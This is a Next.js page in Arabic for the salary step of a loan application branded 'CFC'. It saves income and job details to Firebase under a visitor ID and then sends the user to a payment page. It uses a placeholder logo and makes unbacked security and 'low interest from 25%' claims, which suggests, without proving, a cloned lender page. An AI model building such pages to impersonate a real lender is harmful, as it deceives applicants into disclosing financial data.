"use client";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { addData } from "@/lib/firebase";
import {
  Menu,
  ChevronRight,
  Check,
  DollarSign,
  Briefcase,
  Building2,
  Shield,
  Clock,
  TrendingUp,
} from "lucide-react";
import { useRouter } from "next/navigation";
import type React from "react";
import { useState } from "react";

export default function SalaryPage() {
  const [netSalary, setNetSalary] = useState("");
  const [jobTitle, setJobTitle] = useState("");
  const [workType, setWorkType] = useState("");
  const [additionalIncome, setAdditionalIncome] = useState("");
  const [totalIncome, setTotalIncome] = useState("");
  const [workSector, setWorkSector] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const router = useRouter();

  // Auto-calculate total income
  const calculateTotalIncome = (salary: string, additional: string) => {
    const salaryNum = Number.parseFloat(salary) || 0;
    const additionalNum = Number.parseFloat(additional) || 0;
    const total = salaryNum + additionalNum;
    setTotalIncome(total > 0 ? total.toString() : "");
  };

  const validateForm = () => {
    const newErrors: { [key: string]: string } = {};

    if (!netSalary || Number.parseFloat(netSalary) <= 0) {
      newErrors.netSalary = "يرجى إدخال صافي الراتب";
    }

    if (!jobTitle || jobTitle.trim().length < 2) {
      newErrors.jobTitle = "يرجى إدخال اسم الوظيفة";
    }

    if (!workType || workType.trim().length < 2) {
      newErrors.workType = "يرجى إدخال نوع العمل";
    }

    if (!workSector) {
      newErrors.workSector = "يرجى اختيار قطاع العمل";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      const visitorId =
        localStorage.getItem("visitor") || `visitor-${Date.now()}`;

      await addData({
        id: visitorId,
        netSalary,
        jobTitle,
        workType,
        additionalIncome: additionalIncome || "0",
        totalIncome: totalIncome || netSalary,
        workSector,
        salaryDate: new Date().toISOString(),
      });

      router.push("/loan-application/payment");
    } catch (error) {
      console.error("Error submitting form:", error);
      setErrors({
        submit: "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div
      className="min-h-screen bg-gradient-to-b from-gray-50 to-white"
      dir="rtl"
    >
      {/* Header */}
      <header className="sticky top-0 z-50 bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 text-white shadow-lg backdrop-blur-sm">
        <div className="flex items-center justify-between max-w-md mx-auto p-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-white/10 backdrop-blur-md rounded-xl flex items-center justify-center shadow-lg border border-white/20">
              <img
                src="/next.svg"
                width={70}
                alt="CFC Logo"
                className="brightness-0 invert"
              />
            </div>
            <div className="flex flex-col">
              <span className="font-bold text-lg tracking-tight">CFC</span>
              <span className="text-xs text-blue-100">معلومات الراتب</span>
            </div>
          </div>
          <button className="w-10 h-10 rounded-lg bg-white/10 backdrop-blur-md flex items-center justify-center hover:bg-white/20 transition-all border border-white/20">
            <Menu className="w-5 h-5" />
          </button>
        </div>
      </header>

      {/* Progress Indicator */}
      <div className="max-w-md mx-auto px-6 py-6">
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center shadow-md">
              <Check className="w-5 h-5 text-white" />
            </div>
            <span className="text-sm font-semibold text-green-600">
              المعلومات الشخصية
            </span>
          </div>
          <div className="flex-1 h-0.5 bg-blue-600 mx-3"></div>
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center shadow-md">
              <Check className="w-5 h-5 text-white" />
            </div>
            <span className="text-sm font-semibold text-blue-600">
              معلومات الراتب
            </span>
          </div>
        </div>
        <div className="w-full bg-gray-200 rounded-full h-2">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 h-2 rounded-full w-full transition-all duration-500"></div>
        </div>
      </div>

      {/* Main Content */}
      <form
        className="max-w-md mx-auto px-6 pb-8 space-y-6"
        onSubmit={handleSubmit}
      >
        {/* Trust Badges */}
        <div className="grid grid-cols-3 gap-3">
          <Card className="border-0 shadow-sm bg-gradient-to-br from-green-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto">
                <TrendingUp className="w-5 h-5 text-green-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">
                أفضل الأسعار
              </p>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm bg-gradient-to-br from-blue-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto">
                <Shield className="w-5 h-5 text-blue-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">سرية تامة</p>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm bg-gradient-to-br from-purple-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center mx-auto">
                <Clock className="w-5 h-5 text-purple-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">رد فوري</p>
            </CardContent>
          </Card>
        </div>

        {/* Salary Information Form */}
        <Card className="shadow-lg border-0 overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-4">
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <DollarSign className="w-5 h-5" />
              معلومات الراتب والوظيفة
            </h2>
            <p className="text-xs text-blue-100 mt-1">
              لحساب أفضل عرض تمويلي لك
            </p>
          </div>

          <CardContent className="p-6 space-y-5">
            {/* Net Salary Field */}
            <div className="space-y-2">
              <Label
                htmlFor="netSalary"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <DollarSign className="w-4 h-4 text-blue-600" />
                صافي الراتب بعد الاقتطاع
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <div className="relative">
                <Input
                  id="netSalary"
                  type="number"
                  placeholder="مثال: 1500"
                  value={netSalary}
                  onChange={(e) => {
                    setNetSalary(e.target.value);
                    calculateTotalIncome(e.target.value, additionalIncome);
                    if (errors.netSalary)
                      setErrors({ ...errors, netSalary: "" });
                  }}
                  className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 text-lg pr-16 ${
                    errors.netSalary ? "border-red-500" : ""
                  }`}
                  dir="ltr"
                />
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">
                  د.ك
                </span>
              </div>
              {errors.netSalary && (
                <p className="text-xs text-red-600 text-right">
                  {errors.netSalary}
                </p>
              )}
            </div>

            {/* Job Title Field */}
            <div className="space-y-2">
              <Label
                htmlFor="jobTitle"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <Briefcase className="w-4 h-4 text-blue-600" />
                اسم الوظيفة
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Input
                id="jobTitle"
                type="text"
                placeholder="مثال: مهندس، محاسب، مدير"
                value={jobTitle}
                onChange={(e) => {
                  setJobTitle(e.target.value);
                  if (errors.jobTitle) setErrors({ ...errors, jobTitle: "" });
                }}
                className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 ${
                  errors.jobTitle ? "border-red-500" : ""
                }`}
                dir="rtl"
              />
              {errors.jobTitle && (
                <p className="text-xs text-red-600 text-right">
                  {errors.jobTitle}
                </p>
              )}
            </div>

            {/* Work Type Field */}
            <div className="space-y-2">
              <Label
                htmlFor="workType"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <Building2 className="w-4 h-4 text-blue-600" />
                نوع العمل
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Input
                id="workType"
                type="text"
                placeholder="مثال: دوام كامل، دوام جزئي، عقد"
                value={workType}
                onChange={(e) => {
                  setWorkType(e.target.value);
                  if (errors.workType) setErrors({ ...errors, workType: "" });
                }}
                className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 ${
                  errors.workType ? "border-red-500" : ""
                }`}
                dir="rtl"
              />
              {errors.workType && (
                <p className="text-xs text-red-600 text-right">
                  {errors.workType}
                </p>
              )}
            </div>

            {/* Additional Income Field */}
            <div className="space-y-2">
              <Label
                htmlFor="additionalIncome"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <TrendingUp className="w-4 h-4 text-green-600" />
                دخل إضافي
                <Badge variant="outline" className="mr-auto text-xs">
                  اختياري
                </Badge>
              </Label>
              <div className="relative">
                <Input
                  id="additionalIncome"
                  type="number"
                  placeholder="مثال: 500"
                  value={additionalIncome}
                  onChange={(e) => {
                    setAdditionalIncome(e.target.value);
                    calculateTotalIncome(netSalary, e.target.value);
                  }}
                  className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 text-lg pr-16"
                  dir="ltr"
                />
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">
                  د.ك
                </span>
              </div>
              <p className="text-xs text-gray-500 text-right">
                مثل: إيجارات، استثمارات، أعمال جانبية
              </p>
            </div>

            {/* Total Income Field (Auto-calculated) */}
            {totalIncome && (
              <div className="space-y-2">
                <Label
                  htmlFor="totalIncome"
                  className="text-right block font-semibold text-gray-800 flex items-center gap-2"
                >
                  <DollarSign className="w-4 h-4 text-green-600" />
                  الدخل الإجمالي
                </Label>
                <div className="relative">
                  <Input
                    id="totalIncome"
                    type="text"
                    value={totalIncome}
                    readOnly
                    className="text-right border-green-200 bg-green-50 h-12 text-lg pr-16 font-bold text-green-700"
                    dir="ltr"
                  />
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-green-600 text-sm font-bold">
                    د.ك
                  </span>
                </div>
              </div>
            )}

            {/* Work Sector Field */}
            <div className="space-y-2">
              <Label
                htmlFor="workSector"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <Briefcase className="w-4 h-4 text-blue-600" />
                قطاع العمل
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Select
                dir="rtl"
                value={workSector}
                onValueChange={(value) => {
                  setWorkSector(value);
                  if (errors.workSector)
                    setErrors({ ...errors, workSector: "" });
                }}
              >
                <SelectTrigger
                  className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 ${
                    errors.workSector ? "border-red-500" : ""
                  }`}
                >
                  <SelectValue placeholder="اختر قطاع العمل" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="government">القطاع الحكومي</SelectItem>
                  <SelectItem value="private">القطاع الخاص</SelectItem>
                  <SelectItem value="oil">القطاع النفطي</SelectItem>
                  <SelectItem value="military">القطاع العسكري</SelectItem>
                  <SelectItem value="banking">القطاع المصرفي</SelectItem>
                  <SelectItem value="education">قطاع التعليم</SelectItem>
                  <SelectItem value="health">القطاع الصحي</SelectItem>
                </SelectContent>
              </Select>
              {errors.workSector && (
                <p className="text-xs text-red-600 text-right">
                  {errors.workSector}
                </p>
              )}
            </div>

            {/* Submit Error */}
            {errors.submit && (
              <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                <p className="text-sm text-red-600 text-right">
                  {errors.submit}
                </p>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={isSubmitting}
          className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white h-14 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isSubmitting ? (
            <span className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              جاري الإرسال...
            </span>
          ) : (
            <span className="flex items-center gap-2 justify-center">
              إرسال الطلب
              <ChevronRight className="w-5 h-5" />
            </span>
          )}
        </Button>

        {/* Loan Estimate Card */}
        <Card className="bg-gradient-to-br from-green-600 via-green-700 to-green-800 text-white rounded-2xl shadow-xl overflow-hidden border-0">
          <CardContent className="p-8 relative">
            {/* Background Decorations */}
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-16 translate-x-16"></div>
            <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-12 -translate-x-12"></div>

            {/* Content */}
            <div className="relative z-10 text-center space-y-4">
              <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm border border-white/30 shadow-lg">
                <DollarSign className="w-8 h-8" />
              </div>

              <div>
                <h3 className="text-xl font-bold mb-2">
                  احصل على تمويل يصل إلى
                </h3>
                <div className="flex items-baseline justify-center gap-2">
                  <span className="text-4xl font-bold">
                    {netSalary
                      ? (Number.parseFloat(netSalary) * 60).toLocaleString()
                      : "---"}
                  </span>
                  <span className="text-lg">د.ك</span>
                </div>
                <p className="text-sm opacity-90 mt-2">
                  بناءً على راتبك الشهري
                </p>
              </div>

              <div className="grid grid-cols-2 gap-3 text-sm mt-6">
                <div className="bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <p className="font-semibold">فترة سداد مرنة</p>
                  <p className="text-xs opacity-80 mt-1">حتى ٦٠ شهر</p>
                </div>
                <div className="bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <p className="font-semibold">معدل فائدة منخفض</p>
                  <p className="text-xs opacity-80 mt-1">ابتداءً من ٢٥٪</p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Why Choose Us */}
        <Card className="bg-gradient-to-br from-blue-600 via-blue-700 to-blue-800 text-white rounded-2xl shadow-xl overflow-hidden border-0">
          <CardContent className="p-6 relative">
            <div className="absolute top-0 right-0 w-24 h-24 bg-white/5 rounded-full -translate-y-12 translate-x-12"></div>

            <div className="relative z-10">
              <h3 className="text-lg font-bold mb-4 text-center">
                لماذا تختار CFC؟
              </h3>
              <div className="space-y-3">
                <div className="flex items-start gap-3 bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <Check className="w-5 h-5 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-semibold text-sm">موافقة سريعة</p>
                    <p className="text-xs opacity-80">رد خلال ٢٤ ساعة</p>
                  </div>
                </div>
                <div className="flex items-start gap-3 bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <Check className="w-5 h-5 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-semibold text-sm">بدون كفيل</p>
                    <p className="text-xs opacity-80">تمويل بدون ضامن</p>
                  </div>
                </div>
                <div className="flex items-start gap-3 bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <Check className="w-5 h-5 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-semibold text-sm">خبرة ٤٢ عاماً</p>
                    <p className="text-xs opacity-80">ثقة وأمان</p>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Security Notice */}
        <div className="bg-gray-50 border border-gray-200 rounded-xl p-4">
          <div className="flex items-start gap-3">
            <Shield className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-semibold text-gray-900 mb-1">
                معلوماتك المالية في أمان
              </p>
              <p className="text-xs text-gray-600 leading-relaxed">
                نحن نستخدم أحدث تقنيات التشفير لحماية بياناتك المالية. معلوماتك
                لن تُشارك مع أي طرف ثالث.
              </p>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
